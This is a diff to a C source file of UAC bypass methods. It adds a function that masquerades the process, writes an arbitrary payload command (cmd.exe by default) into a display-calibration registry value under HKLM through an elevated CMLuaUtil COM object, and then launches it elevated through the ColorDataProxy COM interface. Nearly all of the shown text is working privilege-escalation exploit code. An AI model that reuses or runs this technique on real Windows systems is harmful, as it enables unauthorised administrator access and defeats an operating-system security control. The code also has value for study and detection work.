@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.82
+*  VERSION:     2.83
 *
-*  DATE:        02 Nov 2017
+*  DATE:        04 Nov 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -2178,6 +2178,123 @@ BOOL ucmFwCplLuaMethod(
 
     if (FwCplLua != NULL) {
         FwCplLua->lpVtbl->Release(FwCplLua);
+    }
+
+    return SUCCEEDED(r);
+}
+
+/*
+* ucmDccwCOMMethod
+*
+* Purpose:
+*
+* Bypass UAC using ColorDataProxy/CCMLuaUtil undocumented COM interfaces.
+* This function expects that supMasqueradeProcess was called on process initialization.
+*
+*/
+BOOL ucmDccwCOMMethod(
+    _In_opt_ LPWSTR lpszPayload
+)
+{
+    HRESULT          r = E_FAIL;
+    BOOL             bCond = FALSE;
+
+    LPWSTR           lpBuffer = NULL;
+    SIZE_T           sz = 0;
+
+    IID              xIID_ICMLuaUtil;
+    IID              xIID_IColorDataProxy;
+    ICMLuaUtil      *CMLuaUtil = NULL;
+    IColorDataProxy *ColorDataProxy = NULL;
+
+    WCHAR            szBuffer[MAX_PATH + 1];
+
+    do {
+
+        //
+        // Select payload.
+        //
+        if (lpszPayload != NULL) {
+            lpBuffer = lpszPayload;
+        }
+        else {
+            //no payload specified, use default cmd.exe
+            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+            lpBuffer = szBuffer;
+        }
+
+        sz = _strlen(lpBuffer);
+        if (sz == 0)
+            break;
+
+        //
+        // Create elevated COM object for CMLuaUtil.
+        //
+        if (IIDFromString(T_IID_ICMLuaUtil, &xIID_ICMLuaUtil) != S_OK) {
+            break;
+        }
+
+        r = ucmMasqueradedCoGetObjectElevate(
+            T_CLSID_CMSTPLUA,
+            CLSCTX_LOCAL_SERVER,
+            &xIID_ICMLuaUtil,
+            &CMLuaUtil);
+
+        if (r != S_OK)
+            break;
+
+        if (CMLuaUtil == NULL) {
+            r = E_FAIL;
+            break;
+        }
+
+        //
+        // Write new custom calibrator value to HKLM.
+        //
+        r = CMLuaUtil->lpVtbl->SetRegistryStringValue(CMLuaUtil,
+            HKEY_LOCAL_MACHINE,
+            T_DISPLAY_CALIBRATION,
+            T_CALIBRATOR_VALUE,
+            lpBuffer);
+
+        if (FAILED(r))
+            break;
+
+        //
+        // Create elevated COM object for ColorDataProxy.
+        //
+        if (IIDFromString(T_IID_IColorDataProxy, &xIID_IColorDataProxy) != S_OK) {
+            break;
+        }
+
+        r = ucmMasqueradedCoGetObjectElevate(
+            T_CLSID_ColorDataProxy,
+            CLSCTX_LOCAL_SERVER,
+            &xIID_IColorDataProxy,
+            &ColorDataProxy);
+
+        if (r != S_OK)
+            break;
+
+        if (ColorDataProxy == NULL) {
+            r = E_FAIL;
+            break;
+        }
+
+        //
+        // Run our "custom calibrator".
+        //
+        ColorDataProxy->lpVtbl->LaunchDccw(ColorDataProxy, 0);
+
+    } while (bCond);
+
+    if (CMLuaUtil != NULL) {
+        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
+    }
+
+    if (ColorDataProxy != NULL) {
+        ColorDataProxy->lpVtbl->Release(ColorDataProxy);
     }
 
     return SUCCEEDED(r);
